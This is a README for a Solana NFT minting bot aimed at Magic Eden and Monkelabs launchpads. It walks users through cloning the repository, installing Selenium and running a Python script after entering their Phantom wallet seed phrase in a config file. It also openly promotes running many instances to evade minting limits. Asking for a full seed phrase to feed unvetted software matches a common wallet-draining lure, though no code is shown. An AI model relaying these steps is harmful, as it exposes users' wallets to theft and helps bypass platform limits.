# Solana-mint-bot
Magiceden & Monkelabs minting Bot | Mint before anyone
---

The objective of the Bot is to increase your chances of mint on Magic Eden and Monkelabs launchpads. **You can launch as many instances as you want to skip the minting limit and increase your chances even more**.

---

-   This bot uses ChromeDriver so on mac there is a possibility that you will have to **allow the software to run in your privacy settings**. Check mac folder for more info.
-   The chrome window will appear **without** loading the images, this is to ensure the fastest loading.

---

Feel free to support my work with some SOL : DkND4559Q4mE6RSY8tWbtU2YaMyGu3V58kSnvqksPWM7
 
---

### Support

-   [x] Window
-   [x] Mac (Intel + m1)

-   [x] MagicEden.io
-   [x] MonkeLabs.io


## Tutorial

1. Clone the repository / Download zip file

    `git clone https://github.com/MetaplexNFT/solana-mint-bot.git`

    OR

    [Download Zip File](https://github.com/MetaplexNFT/solana-mint-bot/archive/refs/heads/main.zip)
    

2. Install Python, [here is a link to download](https://www.python.org/downloads/)

3. Open command prompt

4. Install all python module

   `pip install selenium requests webdriver-manager`
   
5. Replace Phantom seedPhrase in `config.json`

    `launchpadLink` --> Launchpad link (Magiceden or Monkelabs)

    `seedPhrase` --> Phantom seedPhrase

6. Open CMD and go to directory

    `cd /path/to/directory/solana-mint-bot/`

7. Run the python file

    windows : `python start.py`

    mac : `python3 start.py`
    
8. You can stop the bot with CTRL + C
